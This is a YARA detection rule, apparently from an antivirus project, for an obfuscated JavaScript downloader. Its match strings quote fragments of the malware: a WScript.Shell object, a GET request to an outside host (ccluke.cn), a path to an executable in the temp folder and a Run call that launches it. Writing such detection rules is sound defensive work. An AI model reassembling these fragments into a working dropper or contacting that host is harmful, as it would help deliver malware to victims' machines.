rule sig_20160330_6e2a19d652fb3d06f9e7aa5901543cde {
  meta:
    description = "datamaliciousorder - file 20160330_6e2a19d652fb3d06f9e7aa5901543cde.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ed42430d4ab04c116acb5287a6228d43e8073a76035c1a3c6a1c813e1c5267e6"

  strings:
    $s1  = "var _W1 = function _YD() {return WScript[_V](\"WScript\"+\".Shell\");}(), _I = 11;" fullword ascii
    $s2  = "function _YN(_Y0, _U0){_P = _P * 1; return _Y0 - _U0;};" fullword ascii
    $s3  = "_QF[_Y](\"GET\", \"http://ccluke.cn/b7eus\", false);" fullword ascii
    $s4  = "if (_QF[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _K(){return _W0 + \"\";};" fullword ascii
    $s6  = "function _U() {return _W1[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"qB4Jmexf.ex\" + \"e\";};" fullword ascii
    $s7  = "function _FI(_T){_W1[\"Run\"](_T, _P, _P);};" fullword ascii
    $s8  = "function _MZ() {return ((_RH == true) && (_RH == _P1)) ? 1 : _P;};" fullword ascii
    $s9  = "function _Z(){return 22;};" fullword ascii
    $s10 = "function _W(){return _V;};" fullword ascii
    $s11 = "function _IZ()" fullword ascii
    $s12 = "function _UM(_P0) {var _LO = (1, 2, 3, 4, 5, _P0); return _LO;};" fullword ascii
    $s13 = " while (_TM){" fullword ascii
    $s14 = "var _WX = new this[\"Date\"]();" fullword ascii
    $s15 = "return _YN(_XB, _KT);" fullword ascii
    $s16 = "var _O0 = false;" fullword ascii
    $s17 = "_RH = true; " fullword ascii
    $s18 = "var _P1 = false;" fullword ascii
    $s19 = "var _RH = false;" fullword ascii
    $s20 = "_P1 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}